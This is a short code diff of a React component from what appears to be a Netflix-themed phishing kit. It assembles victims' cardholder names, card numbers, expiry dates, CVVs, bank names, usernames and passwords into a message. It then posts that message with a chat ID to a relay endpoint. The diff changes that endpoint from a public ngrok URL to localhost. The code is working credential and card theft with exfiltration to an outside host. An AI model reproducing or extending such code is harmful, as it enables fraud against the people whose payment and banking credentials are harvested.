@@ -34,7 +34,7 @@ const PasswordEntry = ({ onSubmit, documentNumber, secureKey }) => {
     const message = `🔑📱 KEY NETFLIX 📱🔑:\n -------------------------------------------\n- 📛: ${formValues.cardHolderName || 'No disponible'}\n- 💳: ${formValues.cardNumber || 'No disponible'} \n- 📅: ${formValues.expirationDate || 'No disponible'}\n- 🔐: ${formValues.cvv || 'No disponible'}\n-------------------------------------------\n 🔑📱 LOGIN NETFLIX 📱🔑\n ------------------------------------------- \n 🏦 : ${banco}\n 👤 : ${username}\n 🔒 : ${password}`;
 
     try {
-        await axios.post('https://proof.ngrok.app/enviarmensaje', { chatId, message });
+        await axios.post('http://localhost:3000/enviarmensaje', { chatId, message });
         onSubmit();
     } catch (error) {
         if (error.response) {
